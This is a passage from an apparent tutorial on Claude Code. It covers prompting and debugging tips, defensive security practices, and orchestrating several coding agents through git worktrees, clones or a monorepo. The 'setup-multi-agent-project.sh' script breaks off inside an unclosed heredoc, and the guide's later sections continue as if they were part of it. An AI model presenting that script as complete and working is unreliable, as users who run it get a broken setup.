"Analyze all files in the project"

# ✅ Good: Targeted analysis
"Analyze the authentication module in src/auth/"
```

**2. Efficient Tool Usage:**
```bash
# ❌ Bad: Multiple sequential reads
"Read file1.ts"
"Read file2.ts"
"Read file3.ts"

# ✅ Good: Batch operations
"Read all TypeScript files in src/auth/ that contain 'login'"
```

**3. Session State Management:**
```bash
# Clear context when switching tasks
/clear

# Save session state for complex tasks
"Let's checkpoint our progress on the refactoring"
```

### Advanced Debugging Techniques

**1. Systematic Debugging Approach:**
```bash
# Step 1: Gather information
"Show me the error stack trace and relevant code context"

# Step 2: Form hypotheses
"Based on the error, what are the likely causes?"

# Step 3: Test hypotheses
"Let's add logging to verify our assumption about the data flow"

# Step 4: Implement fix
"Implement the fix for the race condition we identified"
```

**2. Performance Profiling:**
```bash
"Profile the application and identify the top 3 performance bottlenecks"
"Add performance measurements around the database queries"
"Compare performance before and after the optimization"
```

---

## Security Best Practices with Claude Code

### Secure Development Workflows

**1. Handling Secrets:**
```markdown
# CLAUDE.md
# Security Rules
- NEVER commit files containing 'secret', 'password', 'key', 'token'
- Always use environment variables for sensitive data
- Check for exposed credentials before committing
- Use `.env.example` for configuration templates
```

**2. Security Auditing:**
```bash
# Regular security checks
"Run a security audit on the authentication module"
"Check for SQL injection vulnerabilities in the data layer"
"Review the API endpoints for authorization issues"
```

**3. Dependency Management:**
```bash
# Check for vulnerable dependencies
"Analyze package.json for known vulnerabilities"
"Update dependencies with security patches"
"Review the security implications of new dependencies"
```

### Code Review Security Checklist

```markdown
# Security Review Points
- [ ] Input validation on all user inputs
- [ ] Output encoding to prevent XSS
- [ ] Parameterized queries for database access
- [ ] Authentication checks on protected routes
- [ ] Rate limiting on public endpoints
- [ ] Secrets stored in environment variables
- [ ] HTTPS enforced for sensitive operations
- [ ] Error messages don't leak sensitive info
```

## Multi-Agent Orchestration: Deep Dive
### *Scaling Development with Multiple Claude Code Instances*

**Simple Explanation:** Running multiple Claude Code agents is like having a development team where each member specializes in different parts of your project. Git worktrees let each agent work in their own workspace without conflicts, while you orchestrate their efforts.

### Understanding the Power of Multi-Agent Development

When working on complex projects, running multiple Claude Code instances in parallel can dramatically increase productivity:

1. **Parallel Feature Development**: Different agents work on different features
2. **Specialized Roles**: Frontend, backend, testing, documentation agents
3. **Continuous Integration**: One agent handles integration while others develop
4. **Real-time Code Review**: Development and review happen simultaneously

---

## Method 1: Git Worktrees (Recommended)

### What Are Git Worktrees?

Git worktrees allow you to have multiple working directories for the same repository, each checked out to different branches. Perfect for multi-agent development!

### Setting Up Git Worktrees

```bash
# Main repository
cd my-project

# Create worktrees for different features/agents
git worktree add ../my-project-frontend feature/frontend
git worktree add ../my-project-backend feature/backend
git worktree add ../my-project-tests feature/tests
git worktree add ../my-project-integration main

# Your directory structure:
# my-project/           (main worktree)
# my-project-frontend/  (frontend feature branch)
# my-project-backend/   (backend feature branch)
# my-project-tests/     (testing branch)
# my-project-integration/ (integration on main)
```

### Multi-Agent Workflow with Worktrees

**Step 1: Initialize Agents in Each Worktree**

```bash
# Terminal 1: Frontend Agent
cd my-project-frontend
claude
# "I'm working on the frontend features. My branch is feature/frontend"

# Terminal 2: Backend Agent
cd my-project-backend
claude
# "I'm developing the backend API. My branch is feature/backend"

# Terminal 3: Test Agent
cd my-project-tests
claude
# "I'm writing comprehensive tests. My branch is feature/tests"

# Terminal 4: Integration Agent
cd my-project-integration
claude
# "I'm the integration agent. I'll merge and test features from other branches"
```

**Step 2: Orchestration Commands**

```bash
# In Integration Agent:
"Check the status of all worktrees and branches"

"Pull the latest changes from feature/frontend and feature/backend.
Test the integration. If successful, merge to main."

"Coordinate with the test agent to ensure all new features have tests"
```

### Worktree Management Commands

```bash
# List all worktrees
git worktree list

# Remove a worktree
git worktree remove my-project-frontend

# Prune stale worktrees
git worktree prune

# Lock a worktree (prevent deletion)
git worktree lock my-project-integration
```

---

## Method 2: Separate Clones with Shared Remote

### When to Use This Method

- Simpler mental model than worktrees
- Complete isolation between agents
- Easier to manage different configurations per agent
- Good for distributed teams

### Setup

```bash
# Create separate clones
git clone git@github.com:user/project.git project-agent1
git clone git@github.com:user/project.git project-agent2
git clone git@github.com:user/project.git project-agent3
git clone git@github.com:user/project.git project-orchestrator

# Each agent works in their own clone
cd project-agent1
git checkout -b feature/user-auth
claude

cd project-agent2
git checkout -b feature/data-layer
claude
```

### Orchestration Pattern

```bash
# In orchestrator clone
git remote add agent1 ../project-agent1
git remote add agent2 ../project-agent2
git remote add agent3 ../project-agent3

# Pull changes from agents
git fetch --all
git merge agent1/feature/user-auth
git merge agent2/feature/data-layer
```

---

## Method 3: Monorepo with Package-Based Agents

### Structure for Large Projects

```
my-monorepo/
├── packages/
│   ├── frontend/        # Agent 1 domain
│   ├── backend/         # Agent 2 domain
│   ├── shared/          # Shared code
│   └── testing/         # Agent 3 domain
├── orchestrator/        # Integration scripts
└── CLAUDE.md           # Shared configuration
```

### Agent Specialization

```bash
# Agent 1: Frontend Specialist
cd my-monorepo
claude
# "I'm the frontend specialist. I only work in packages/frontend"

# Agent 2: Backend Specialist
cd my-monorepo
claude
# "I'm the backend specialist. I only work in packages/backend"

# Orchestrator
cd my-monorepo
claude
# "I coordinate between packages and handle integration"
```

---

## Orchestration Boilerplate Starter

### Complete Multi-Agent Project Template

Save this as `setup-multi-agent-project.sh`:

```bash
#!/bin/bash
# Multi-Agent Claude Code Project Setup
# Usage: ./setup-multi-agent-project.sh my-awesome-project

PROJECT_NAME=${1:-"multi-agent-project"}
GITHUB_USER=${2:-"your-username"}

echo "🚀 Setting up multi-agent project: $PROJECT_NAME"

# Create main repository
mkdir $PROJECT_NAME
cd $PROJECT_NAME
git init
git checkout -b main

# Create initial structure
mkdir -p src/{frontend,backend,shared} tests docs .claude/commands orchestrator

# Create CLAUDE.md for shared configuration
cat > CLAUDE.md << 'EOF'
# Multi-Agent Development Project

## Best Practices for Multi-Agent Development

### 1. Clear Boundaries

```markdown
# CLAUDE.md section for agent boundaries
## Agent Boundaries

### Frontend Agent
- ONLY modifies files in src/frontend/
- NEVER touches backend code directly
- Communicates needs through API contracts

### Backend Agent  
- ONLY modifies files in src/backend/
- NEVER implements UI logic
- Provides clear API documentation
```

### 2. Communication Protocols

```bash
# In Integration Agent
"Check the PR queue from all agents.
Summarize what each agent has ready for integration.
Identify any conflicts or dependencies."

# In Feature Agent
"I've completed the user authentication UI.
Creating PR with clear description of API requirements.
Tagging integration agent for review."
```

### 3. Conflict Resolution

```bash
# Orchestrator handling conflicts
"Two agents have modified shared types.
Let me resolve this by:
1. Creating a shared types file
2. Updating both agents' code
3. Establishing ownership rules"
```

### 4. Progress Tracking

```markdown
# orchestrator/daily-standup.md
## Date: 2024-01-15

### Frontend Agent
- ✅ Completed login form
- 🔄 Working on dashboard
- 🚧 Blocked: Need user API endpoint

### Backend Agent
- ✅ Database schema ready
- 🔄 Implementing user API
- 📅 ETA: 2 hours

### Testing Agent
- ✅ Test infrastructure setup
- 🔄 Writing auth tests
- 📊 Coverage: 75%
```

### 5. Continuous Integration

```yaml
# .github/workflows/multi-agent-ci.yml
name: Multi-Agent CI

on:
  pull_request:
    branches: [main]

jobs:
  integrate:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
        with:
          fetch-depth: 0
      
      - name: Check agent branches
        run: |
          git fetch --all
          for branch in feature/frontend feature/backend feature/tests; do
            echo "Checking $branch..."
            git diff main...$branch --stat
          done
      
      - name: Run integration tests
        run: npm test
```

## Advanced Orchestration Patterns

### Pattern 1: Round-Robin Development

```bash
# Orchestrator coordinates feature development
"Start Round-Robin for user profile feature:
1. Backend: Create data model and API (30 min)
2. Frontend: Build UI components (30 min)  
3. Testing: Write tests (30 min)
4. Docs: Update documentation (15 min)
5. Integration: Merge and deploy (15 min)"
```

### Pattern 2: Parallel Sprints

```bash
# Multiple features in parallel
"Sprint Plan:
- Frontend Agent: Work on Feature A UI
- Backend Agent: Work on Feature B API
- Testing Agent: Test Feature C (from last sprint)
- Docs Agent: Document Feature D (completed)
All agents work simultaneously, integration every 2 hours"
```

### Pattern 3: Specialist Rotation

```bash
# Agents can switch specialties
"Rotation Plan:
- Morning: Agent 1 = Frontend, Agent 2 = Backend
- Afternoon: Agent 1 = Testing, Agent 2 = Frontend
This ensures knowledge sharing and prevents silos"
```

## Troubleshooting Multi-Agent Setup

### Common Issues and Solutions

**1. Worktree Conflicts**
```bash
# Error: worktree already exists
git worktree remove my-project-frontend --force
git worktree prune
git worktree add my-project-frontend feature/frontend
```

**2. Branch Synchronization**
```bash
# Keep branches updated
git worktree list | while read -r worktree; do
  dir=$(echo $worktree | awk '{print $1}')
  echo "Updating $dir"
  git -C "$dir" pull origin main
done
```

**3. Agent Context Loss**
```markdown
# Add to CLAUDE.md
## Agent Context Recovery

If you lose context, check:
1. Your designated branch: `git branch --show-current`
2. Your working directory: `pwd`
3. Your responsibilities: See orchestrator/config.json
4. Current sprint goals: See orchestrator/status.md
```

**4. Integration Bottlenecks**
```bash
# Parallel integration strategy
"Instead of sequential integration:
1. Create integration branches for each agent
2. Test each integration independently
3. Merge all to main simultaneously
4. Run full integration test suite"
```

## Future of Multi-Agent Development

### Scaling Beyond 5 Agents

For larger projects, consider:
1. **Hierarchical Orchestration**: Lead orchestrator with sub-orchestrators
2. **Domain-Driven Agents**: Agents per business domain
3. **Microservice Agents**: One agent per microservice
4. **Platform Teams**: Infrastructure agents supporting feature agents

### AI-Native Development Teams

The future might include:
- Specialized AI agents for different technologies
- Self-organizing agent teams
- Autonomous integration and deployment
- AI architects designing system structures

### Getting Started Today

1. Start small with 2-3 agents
2. Master worktree management
3. Establish clear communication patterns
4. Gradually increase complexity
5. Share learnings with the community
